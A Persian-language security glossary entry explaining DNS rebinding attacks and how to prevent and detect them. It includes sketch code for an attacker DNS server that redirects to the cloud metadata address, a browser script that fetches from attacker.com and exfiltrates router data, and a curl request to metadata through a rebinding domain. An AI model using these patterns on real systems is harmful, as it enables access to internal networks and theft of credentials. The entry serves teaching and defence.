## تعریف کوتاه
DNS rebinding زمانی است که مهاجمان یک دامنه را کنترل می‌کنند و مدام آدرس IP آن را تغییر می‌دهند. ابتدا، بررسی امنیتی می‌بیند که به یک IP امن اشاره می‌کند (عبور می‌کند). سپس، قبل از درخواست واقعی، آن را تغییر می‌دهند تا به سرورهای داخلی اشاره کند (حمله موفق می‌شود). زمان‌بندی همه چیز است.

## تعریف کامل
DNS rebinding از شکاف بین بررسی‌های رزولوشن DNS و اتصالات شبکه واقعی با تغییر رکوردهای DNS با TTL (زمان تا انقضا) بسیار کوتاه بهره‌برداری می‌کند.

**جریان حمله:**

۱. **مهاجم کنترل می‌کند:** evil.com
۲. **تنظیم TTL DNS:** ۰ ثانیه (انقضای فوری)
۳. **رزولوشن اولیه:** evil.com → 1.2.3.4 (سرور مهاجم)
۴. **بررسی امنیتی:** "1.2.3.4 امن است" ✓
۵. **رکورد DNS تغییر می‌کند:** evil.com → 192.168.1.1 (IP داخلی)
۶. **درخواست واقعی:** دوباره حل می‌کند، 192.168.1.1 می‌گیرد
۷. **درخواست به:** سرور داخلی می‌رود

**چرا کار می‌کند:**
- کش DNS ممکن است با TTL=0 دور زده شود
- بررسی‌های امنیتی و درخواست‌های واقعی کش DNS مشترک ندارند
- برنامه‌ها برای هر درخواست DNS را دوباره حل می‌کنند
- هیچ اعتبارسنجی‌ای برای ثابت ماندن IP وجود ندارد

## چرا مهم است
- محافظت‌های SSRF مبتنی بر IP را دور می‌زند
- حتی با لیست سفید دامنه مناسب کار می‌کند
- دفاع در برابر آن دشوار است
- می‌تواند مرورگرها، سرورها، دستگاه‌های IoT را هدف قرار دهد
- دسترسی به شبکه‌های داخلی را ممکن می‌سازد

## چگونه مهاجمان از آن استفاده می‌کنند
**دور زدن کلاسیک SSRF:**

```python
# کد برنامه:
url = user_input  # "http://attacker.com/path"
parsed = urlparse(url)

# بررسی امنیتی:
ip = socket.gethostbyname(parsed.hostname)
if not is_private_ip(ip):  # بررسی عبور می‌کند: IP عمومی
    # فاصله زمانی اینجا!
    response = requests.get(url)  # دوباره حل می‌کند، IP خصوصی می‌گیرد
    return response
```

**راه‌اندازی حمله:**

```python
# سرور DNS مهاجم به صورت پویا پاسخ می‌دهد:
def handle_dns_query(domain):
    if request_count(domain) == 0:
        return "1.2.3.4"  # IP عمومی برای اولین درخواست
    else:
        return "169.254.169.254"  # سرویس متادیتا برای دومین
```

**حمله مبتنی بر مرورگر:**

```javascript
// صفحه مخرب در مرورگر بارگیری می‌شود
fetch('http://attacker.com/rebind')
  .then(() => {
    // DNS rebinding اتفاق افتاد
    // اکنون به 192.168.1.1 (روتر) اشاره می‌کند
    // می‌تواند به صفحه مدیریت روتر دسترسی یابد
    fetch('http://attacker.com/admin')
      .then(data => exfiltrate(data));
  });
```

## چگونه تشخیص یا پیشگیری کنیم
**پیشگیری:**

**۱. دوباره حل کنید و قبل از هر درخواست دوباره بررسی کنید:**
```python
def safe_fetch(url):
    # بررسی اولیه
    ip1 = resolve(url)
    if is_private_ip(ip1):
        reject()
    
    # مکث برای اعمال هرگونه تغییر DNS
    time.sleep(1)
    
    # دوباره بررسی درست قبل از درخواست
    ip2 = resolve(url)
    if ip2 != ip1 or is_private_ip(ip2):
        reject()
    
    # درخواست را با استفاده مستقیم از IP انجام دهید
    return requests.get(f"http://{ip2}{path}")
```

**۲. استفاده از IP به جای نام میزبان:**
```python
# یک بار حل کنید، در همه جا از IP استفاده کنید
ip = resolve_and_validate(hostname)
response = requests.get(
    f"http://{ip}{path}",
    headers={"Host": hostname}
)
```

**۳. حداقل TTL DNS:**
```python
# نادیده گرفتن TTL زیر آستانه
def resolve(hostname):
    result = dns.query(hostname)
    if result.ttl < 300:  # حداقل ۵ دقیقه
        result.ttl = 300
    return result.ip
```

**۴. ثابت کردن رزولوشن DNS:**
```python
# استفاده از یک رزولوشن برای کل عملیات
with dns_pinned(url):
    validate(url)
    response = fetch(url)
    process(response)
```

**محافظت‌های مرورگر:**
- محدودیت‌های پیش‌واکشی DNS
- محدودیت‌های دسترسی به شبکه خصوصی (Chrome)
- CORS با محافظت‌های DNS rebinding

**تشخیص:**
- نظارت بر پرس‌وجوهای DNS با TTL=0
- هشدار در مورد دامنه‌هایی که به سرعت به IPهای مختلف حل می‌شوند
- ردیابی دامنه‌هایی که از عمومی به خصوصی تغییر می‌کنند
- ثبت IP اعتبارسنجی و IP درخواست واقعی

## باورهای غلط رایج
- "یک بار بررسی IP کافی است" - DNS می‌تواند تغییر کند
- "TTL=0 باید مسدود شود" - گاهی قانونی است
- "HTTPS از این جلوگیری می‌کند" - گواهی ممکن است همچنان معتبر باشد
- "فقط بر مرورگرها تأثیر می‌گذارد" - برنامه‌های سمت سرور نیز
- "فایروال آن را مسدود می‌کند" - فایروال درخواست خروجی معتبر می‌بیند

## مثال واقعی
**ربودن روتر (۲۰۱۸)**

۱. **قربانی بازدید می‌کند:** evil-ad.com (تبلیغ مخرب)
۲. **رزولوشن اولیه:** evil-ad.com → 1.2.3.4 (CORS را پاس می‌کند)
۳. **DNS rebinding:** evil-ad.com → 192.168.1.1 (روتر)
۴. **درخواست‌های JavaScript:** اکنون به مدیریت روتر دسترسی دارد
۵. **بهره‌برداری:** تغییر تنظیمات DNS، تغییر مسیر ترافیک

**بهره‌برداری از متادیتا در Kubernetes**

```bash
# دامنه مهاجم: rebind.example.com
# TTL: ۰

# رزولوشن اولیه:
rebind.example.com → 52.1.2.3 (لیست سفید را پاس می‌کند)

# رزولوشن دوم (میکروثانیه بعد):
rebind.example.com → 169.254.169.254 (متادیتا)

# برنامه درخواست می‌کند:
curl http://rebind.example.com/latest/meta-data/
# در واقع به سرویس متادیتا می‌خورد
```

**Singularity of Origin**

ابزار عمومی که DNS rebinding را نشان می‌دهد:
- هدف قرار دادن سرویس‌های داخلی
- چرخش خودکار IP
- بهره‌برداری‌های از پیش ساخته برای روترها، پنل‌های مدیریت
- تأثیر واقعی را نشان می‌دهد
